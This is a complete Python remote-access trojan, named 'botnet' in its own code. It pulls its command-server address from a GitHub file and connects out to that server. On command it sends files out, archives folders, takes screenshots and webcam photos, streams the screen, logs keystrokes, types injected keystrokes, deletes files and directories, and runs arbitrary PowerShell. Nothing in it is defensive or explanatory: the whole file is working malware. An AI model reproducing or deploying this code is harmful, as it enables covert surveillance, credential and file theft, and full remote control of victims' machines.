from socket import socket,SHUT_WR,AF_INET,SOCK_STREAM
from base64 import decodebytes
from os import system , remove , listdir,mkdir,getcwd,chdir,walk
from os.path import join,basename
from subprocess import run
from time import sleep
from requests import get
from tkinter import Tk,messagebox
from shutil import rmtree
from threading import Thread
from datetime import datetime
from pynput.keyboard import Listener
from zipfile import ZipFile,ZIP_DEFLATED
from numpy import array
from cv2 import cvtColor,COLOR_RGB2BGR,imwrite
import cv2
import pyautogui
from zlib import compress
import numpy as np

from mss import mss



reconnect_time_interval = 300
home = getcwd()
finish_time=22


def screenshare():
	try:
		while True: 
			img = pyautogui.screenshot()  
			frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
			np.save('h.npy',frame)
			with open('h.npy','wb') as f:
				data = f.read(10240)
				while data:
					client.send(data)
					data = f.read(10240)
			reconnect()
		
	except Exception as err:
		print(err)

######################## connecting to server and other miscalleneous code ########################################

def server_ip(repo):
	r   = get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
	req = bytes(r.json()['content'],encoding='utf-8')
	host,port=decodebytes(req).decode('utf8').split(':')
	return host,int(port)

	
def reconnect():
	global client
	client.shutdown(SHUT_WR)
	client.close()
	client = socket(AF_INET,SOCK_STREAM)
	client.connect((HOST, PORT))



######################## connecting to server and other miscalleneous code ########################################
























############################# MESSING WITH THIER FILES! #############################################



def recv_b_file(size=1024):
	client.send('ready'.encode('utf-8'))
	name = client.recv(1024).decode('utf-8')
	client.send('ready'.encode('utf-8'))
	with open(name,'wb') as f:
		file_contents = client.recv(size)
		while file_contents:
			f.write(file_contents)
			file_contents = client.recv(size)

	reconnect()


def send_b_file(size=1024):
	try:
		path = client.recv(1024).decode('utf-8')
		with open(path,'rb') as f:
			client.send('ready'.encode('utf-8'))
			file_contents=f.read(size)
			while file_contents:
				client.send(file_contents)
				file_contents=f.read(size)

		reconnect()
	except Exception as err:
		client.send(str(err).encode('utf-8'))


def recv_t_file(size=1024):
	client.send('ready'.encode('utf-8'))
	name = client.recv(1024).decode('utf-8')
	client.send('ready'.encode('utf-8'))
	with open(name,'w') as f:
		file_contents = client.recv(size).decode('utf-8')
		while file_contents:
			if '~~exit~~' in file_contents:
				f.write(file_contents.replace('~~exit~~',''))
				break
			f.write(file_contents)
			file_contents = client.recv(size).decode('utf-8')


def send_t_file(size=1024):
	try:
		path = client.recv(1024).decode('utf-8')
		with open(path,'r') as f:
			client.send('ready'.encode('utf-8'))
			file_contents = f.read(size)
			while file_contents:
				client.send(file_contents.encode('utf-8'))
				file_contents = f.read(size)
		client.send('~~exit~~'.encode('utf-8'))
	except Exception as err:
		client.send(str(err).encode('utf-8'))


def extract_zip(zip_path,extract_path):
	with ZipFile(zip_path,'r') as f:
		client.send('ready'.encode('utf-8'))
		if extract_path=='blank':
			f.extractall()
		else:
			f.extractall(extract_path)

def archive(folder,zip_name):
	folder = join(folder,'') # to add the / or \ 
	current_path = getcwd()
	folder_path  = join(current_path,folder)
	zip_path     = join(current_path,zip_name)

	chdir(folder)

	with ZipFile(zip_path,'w',compression=ZIP_DEFLATED) as myzip:
		for root,dirs,files in walk(folder_path):
			for file in files:
				root = root.replace(folder_path,'')
				file = join(root,file)
				myzip.write(file)

def screenshot():
	try:
		size=1024
		client.send('ready'.encode('utf-8'))
		image = cvtColor(array(pyautogui.screenshot()),COLOR_RGB2BGR)
		file_name = 'screenshot.png'

		imwrite(file_name, image)

		with open(file_name,'rb') as f:
			file_contents=f.read(size)
			while file_contents:
				client.send(file_contents)
				file_contents=f.read(size)

		remove(file_name)
		reconnect()
	except Exception as err:
		print(err)

def take_picture():
	try:
		size=1024
		client.send('ready'.encode('utf-8'))
		cam = cv2.VideoCapture(0)
		ret,frame = cam.read()
		file_name = 'screenshot.png'

		imwrite(file_name,frame)

		with open(file_name,'rb') as f:
			file_contents=f.read(size)
			while file_contents:
				client.send(file_contents)
				file_contents=f.read(size)

		remove(file_name)
		reconnect()
	except Exception as err:
		print(err)
############################# MESSING WITH THIER FILES! #############################################























########################## HACKING SCRIPTS ###########################################################


def keyboard(option,size=1024):
	client.send('ready'.encode('utf-8'))
	if option==1:
		name = 'script.pyw'
		recv_t_file(name)
		system(name)
		remove(name)

			


	elif option==2:
		while True:
			string = client.recv(size).decode('utf-8')+'\n'
			if string=='exit\n':
				return

			else:
				for i in string:
					pyautogui.typewrite(i)







def keylogger():
	string = ''
	file_name = str(datetime.today().date())+'.txt'

	path = join(home,'logs',file_name)

	def write(key):
		nonlocal l,string
		key=str(key)
		with open(path,'a') as f:
			if datetime.now().hour >= finish_time:
				f.write(string+'\n')
				l.stop()
			else:
				if key=='Key.enter':
					f.write(string+'\n')
					string=''

				elif key=='Key.space':
					string+=' '
	
				elif 'Key' in key:
					string+='~'+key+'~'

				else:
					string+=key.replace("'","")

	with Listener(on_press=write) as l:
		if 'logs' not in listdir(home):
			mkdir('logs')
		l.join()






def popup():
	root = Tk()
	root.withdraw()
	client.send('s'.encode('utf-8'))
	title   = client.recv(1024).decode('utf-8')
	client.send('s'.encode('utf-8'))
	message = client.recv(1024).decode('utf-8')
	client.send('s'.encode('utf-8'))
	ptype   = client.recv(1024).decode('utf-8')
	client.send('s'.encode('utf-8'))
	if ptype=='error':
		messagebox.showerror(title,message)
	elif ptype=='warning':
		messagebox.showwarning(title,message)
	elif ptype=='info':
		messagebox.showinfo(title,message)









########################## HACKING SCRIPTS ###########################################################




























def botnet():
	global client,HOST,PORT,finish_time,t1
	HOST,PORT = server_ip('server_address')
	crash_in = 100
	t1 = Thread(target=keylogger)

	client = socket(AF_INET,SOCK_STREAM)
	client.connect((HOST, PORT))

	while True:
		server_command = client.recv(1024).decode('utf-8')
	
		if server_command=='':
			crash_in-=1

		if crash_in==0:
			break

		if server_command=='send binary file':
			recv_b_file()

		elif server_command=='send text file':
			recv_t_file()

		elif server_command=='recieve binary file':
			send_b_file()

		elif server_command=='recieve text file':
			send_t_file()

		elif server_command=='extract zip':
			client.send('ready'.encode('utf-8'))
			zip_path = client.recv(1024).decode('utf-8')
			extract_path = client.recv(1024).decode('utf-8')
			tz = Thread(target=extract_zip,args=(zip_path,extract_path))
			tz.start()

		elif server_command=='archive directory':
			client.send('ready'.encode('utf-8'))
			folder = client.recv(1024).decode('utf-8')
			client.send('ready'.encode('utf-8'))
			zip_name = client.recv(1024).decode('utf-8')
			
			ta = Thread(target=archive,args=(folder,zip_name))
			ta.start()

		elif server_command=='screenshot':
			screenshot()

		elif server_command=='take picture':
			take_picture()


































			








		elif server_command=='ls':
			output = ''
			for obj in listdir():
				output+=str(obj)+'\n'
			client.send(output.encode('utf-8'))
			client.send('~~exit~~'.encode('utf-8'))

		elif server_command[:2]=='cd':
			chdir(server_command.split()[1])
			client.send(getcwd().encode('utf-8'))

		elif server_command=='pwd':
			client.send(getcwd().encode('utf-8'))

		elif server_command=='make directory':
			client.send('ready'.encode('utf-8'))
			directory = client.recv(1024).decode('utf-8')
			mkdir(directory)

		elif server_command=='remove file':
			client.send('ready'.encode('utf-8'))
			file = client.recv(1024).decode('utf-8')
			remove(file)

		elif server_command=='remove directory':
			client.send('ready'.encode('utf-8'))
			directory = client.recv(1024).decode('utf-8')
			rmtree(directory)




		elif server_command=='keyboard access':
			client.send('ready'.encode('utf-8'))
			option=int(client.recv(1024).decode('utf-8'))
			keyboard(option)

		elif server_command=='start keylogger':
			t1.start()

		elif server_command=='stop keylogger':
			finish_time=datetime.now().hour
			t1.join()
			t1 = Thread(target=keylogger)

		elif server_command=='open':
			try:
				client.send('ready'.encode('utf-8'))
				path = client.recv(1024).decode('utf-8')
				current_path = getcwd()
				file = basename(path)
				chdir(path.replace(file,''))
				system(file)
				chdir(current_path)
			except:
				pass

		elif server_command=='popup':
			popup()

		elif server_command=='exit':
			break

		elif server_command=='powershell':
			client.send('ready'.encode('utf-8'))
			p1=run(['powershell.exe',client.recv(1024).decode('utf-8')],shell=True,capture_output=True,text=True)
			client.send(p1.stdout.encode('utf-8'))
			client.send('~~exit~~'.encode('utf-8'))
			#client.send('\ncommand was executed\n'.encode('utf-8'))





botnet()
